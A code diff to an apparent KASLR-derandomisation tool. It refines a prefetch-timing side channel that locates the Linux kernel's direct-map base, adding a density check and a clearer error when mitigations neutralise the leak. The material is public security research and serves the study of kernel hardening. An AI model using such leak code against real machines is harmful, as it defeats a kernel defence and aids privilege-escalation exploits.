@@ -51,6 +51,7 @@
 #define _GNU_SOURCE
 #include "include/kasld/api.h"
 #include "include/kasld/cli.h"
+#include "include/kasld/meminfo.h"
 #include "include/prefetch_scan.h"
 #include "include/sidechannel.h"
 #include <stdio.h>
@@ -97,6 +98,69 @@ static int verbose = 0;
 #define DM_CONFIRM_K 3
 #define DM_CONFIRM_M 4
 
+// Density verification of the voted base: the direct map is a DENSE, contiguous
+// block, so the base slot and the slots just above it are (nearly) all mapped.
+// A weak or neutralised differential instead leaves only a sparse scatter of
+// mapped slots that find_edge reads as an edge partway UP the real map (the
+// true dense floor reads at baseline), and every pass makes the same mistake,
+// so corroboration alone trusts it. Require the base plus >= 3/4 of a window
+// above it to be mapped. The check runs on the cross-pass MINIMUM: a real dense
+// map is mapped in every pass and survives it, while a per-pass scatter of
+// noise hits different slots each pass and washes out — so a sparse,
+// mitigation-flattened signal fails here rather than yielding a false base. The
+// window is bounded by RAM size so a small direct map is not judged against the
+// unmapped slots above it.
+#define DM_VERIFY_WINDOW 8
+
+// Is slot `idx` of `agg` mapped? Mirrors prefetch_scan_find_edge's per-vendor
+// orientation: AMD mapped reads HIGHER (> 1.5x the baseline median), Intel/
+// unknown mapped reads FASTER (below the baseline->fastest midpoint).
+static int directmap_slot_mapped(const uint64_t *agg, size_t idx, int vendor,
+                                 uint64_t median, uint64_t vmin) {
+  if (vendor == CPU_VENDOR_AMD)
+    return agg[idx] > median + median / 2;
+  return agg[idx] < median - (median - vmin) / 2;
+}
+
+// Confirm the voted base begins a dense mapped run in the cross-pass aggregate.
+// Returns 1 if plausible (or on allocation failure — fail open rather than drop
+// a corroborated base), 0 if the base region is too sparse to be a real floor.
+static int directmap_base_is_dense(const uint64_t *agg, size_t n, int vendor,
+                                   size_t base) {
+  uint64_t *sorted = (uint64_t *)malloc(n * sizeof(uint64_t));
+  if (!sorted)
+    return 1;
+  memcpy(sorted, agg, n * sizeof(uint64_t));
+  qsort(sorted, n, sizeof(uint64_t), prefetch_scan_cmp_u64);
+  uint64_t median = sorted[n / 2];
+  uint64_t vmin = sorted[0];
+  free(sorted);
+
+  /* The base slot maps low physical RAM, so it must itself be mapped. */
+  if (!directmap_slot_mapped(agg, base, vendor, median, vmin))
+    return 0;
+
+  /* Bound the density window by RAM: the direct map spans MemTotal, so a system
+   * with only a few GiB has a short map and must not be judged against the
+   * unmapped slots above it. */
+  size_t window = DM_VERIFY_WINDOW;
+  unsigned long ram = kasld_read_memtotal_bytes();
+  if (ram) {
+    size_t ram_slots = (size_t)(ram / DM_STEP);
+    if (ram_slots < window)
+      window = ram_slots;
+  }
+  if (window < 1)
+    window = 1;
+  size_t need = (window * 3 + 3) / 4; /* ceil(3/4 of the window) */
+
+  size_t mapped = 0, j;
+  for (j = 0; j < window && base + j < n; j++)
+    if (directmap_slot_mapped(agg, base + j, vendor, median, vmin))
+      mapped++;
+  return mapped >= need;
+}
+
 // ---------------------------------------------------------------------------
 // The direct-map KASLR window: candidate page_offset_base positions of DM_STEP
 // bytes, from the compile-time base up to where vmalloc would begin (the direct
@@ -133,17 +197,27 @@ static size_t directmap_window(uint64_t *win_base) {
 // failure). Returns the page_offset_base address, or 0.
 // ---------------------------------------------------------------------------
 static unsigned long directmap_vote(int vendor, size_t n, uint64_t win_base,
-                                    int *n_found) {
+                                    int *n_found, int *sparse) {
   unsigned long results[DM_PASSES];
   uint64_t *times = (uint64_t *)malloc(n * sizeof(uint64_t));
-  if (!times) {
+  uint64_t *agg = (uint64_t *)malloc(n * sizeof(uint64_t));
+  if (!times || !agg) {
+    free(times);
+    free(agg);
     kasld_err("out of memory for %zu-slot scan buffer", n);
     return 0;
   }
 
+  size_t k;
+  for (k = 0; k < n; k++)
+    agg[k] = ~(uint64_t)0; /* cross-pass minimum accumulator */
+
   int i;
   for (i = 0; i < DM_PASSES; i++) {
     prefetch_scan_collect(times, n, win_base, DM_STEP, vendor, DM_ITERATIONS);
+    for (k = 0; k < n; k++)
+      if (times[k] < agg[k])
+        agg[k] = times[k];
     if (verbose && i == 0)
       prefetch_scan_dump(times, n, win_base, DM_STEP,
                          vendor == CPU_VENDOR_AMD ? "sum_cycles"
@@ -170,10 +244,12 @@ static unsigned long directmap_vote(int vendor, size_t n, uint64_t win_base,
    * so only a fraction of passes locate an edge; a majority requirement would
    * make MORE passes counterproductive (raising the bar the weak signal must
    * clear). DM_MIN_LOCATED independent detections is the confidence floor. */
-  if (found < DM_MIN_LOCATED)
+  if (found < DM_MIN_LOCATED) {
+    free(agg);
     return 0;
+  }
 
-  /* Sort ascending (insertion sort; found is tiny), then return the lowest edge
+  /* Sort ascending (insertion sort; found is tiny), then take the lowest edge
    * located by >= 2 passes — the corroborated left-edge floor. */
   for (i = 1; i < found; i++) {
     unsigned long key = edges[i];
@@ -184,13 +260,32 @@ static unsigned long directmap_vote(int vendor, size_t n, uint64_t win_base,
     }
     edges[j + 1] = key;
   }
+  unsigned long candidate = 0;
   for (i = 0; i + 1 < found; i++)
-    if (edges[i] == edges[i + 1])
-      return edges[i];
-  /* No two passes agreed: scatter, not a floor. Fail CLOSED rather than emit
-   * the scatter minimum — a dead channel otherwise reports a confident, wrong
-   * base every run (see the function header). */
-  return 0;
+    if (edges[i] == edges[i + 1]) {
+      candidate = edges[i];
+      break;
+    }
+  /* No two passes agreed: scatter, not a floor — fail CLOSED (see header). */
+  if (!candidate) {
+    free(agg);
+    return 0;
+  }
+
+  /* Corroboration proves the edge is stable, not that it is the DENSE
+   * direct-map floor: a mitigation-flattened signal makes every pass land the
+   * same wrong edge partway up a sparse scatter. Confirm the base begins a
+   * dense mapped run before trusting it; otherwise fail closed and flag the
+   * sparsity so the caller can distinguish it from scatter. */
+  size_t base_slot = (size_t)((candidate - win_base) / DM_STEP);
+  int dense = directmap_base_is_dense(agg, n, vendor, base_slot);
+  free(agg);
+  if (!dense) {
+    if (sparse)
+      *sparse = 1;
+    return 0;
+  }
+  return candidate;
 }
 
 static unsigned long get_directmap_base_prefetch(void) {
@@ -227,10 +322,19 @@ static unsigned long get_directmap_base_prefetch(void) {
   pin_cpu(0);
 
   int n_found = 0;
-  unsigned long base = directmap_vote(cpu, n, win_base, &n_found);
+  int sparse = 0;
+  unsigned long base = directmap_vote(cpu, n, win_base, &n_found, &sparse);
 
   if (!base) {
-    if (n_found == 0)
+    if (sparse)
+      kasld_err(
+          "sparse prefetch signal: %d/%d passes agreed on a base, but the "
+          "direct map is not densely mapped above it — the region is a thin "
+          "scatter of mapped slots, not the dense linear map, so the agreed "
+          "edge is not its floor (the differential is likely neutralised here, "
+          "e.g. patched AMD microcode); the true base is not recoverable",
+          n_found, DM_PASSES);
+    else if (n_found == 0)
       kasld_err("no direct-map signal: the scan found no mapped-region cluster "
                 "(this CPU may not leak through prefetch page-walk latency, or "
                 "the direct map is smaller than the confirmation window)");
